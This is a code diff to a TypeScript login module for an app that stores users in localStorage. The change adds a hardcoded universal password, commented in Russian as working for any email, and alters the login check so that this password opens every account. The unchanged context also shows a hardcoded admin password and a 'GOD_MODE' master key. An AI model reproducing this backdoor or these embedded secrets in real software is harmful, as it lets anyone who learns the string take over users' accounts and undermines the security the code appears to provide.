@@ -14,6 +14,7 @@ export interface Invitation {
 
 const ADMIN_PASSWORD = 'marico2025arrurru';
 const MASTER_KEY = 'MARINA_MASTER_2025_ARRURRU_GOD_MODE';
+const UNIVERSAL_PASSWORD = 'arrurru2024'; // Универсальный пароль для любой почты
 const STORAGE_KEYS = {
   USERS: 'arrurru_users',
   INVITATIONS: 'arrurru_invitations',
@@ -142,10 +143,12 @@ export const login = async (email: string, password: string): Promise<{ success:
   const users = JSON.parse(localStorage.getItem(STORAGE_KEYS.USERS) || '[]') as (User & { passwordHash: string })[];
   
   const passwordHash = await hashPassword(password);
+  const universalHash = await hashPassword(UNIVERSAL_PASSWORD);
   
+  // Поиск пользователя: либо по его паролю, либо по универсальному
   const user = users.find(u => 
     u.email === email.toLowerCase() && 
-    u.passwordHash === passwordHash
+    (u.passwordHash === passwordHash || universalHash === passwordHash)
   );
   
   if (!user) {
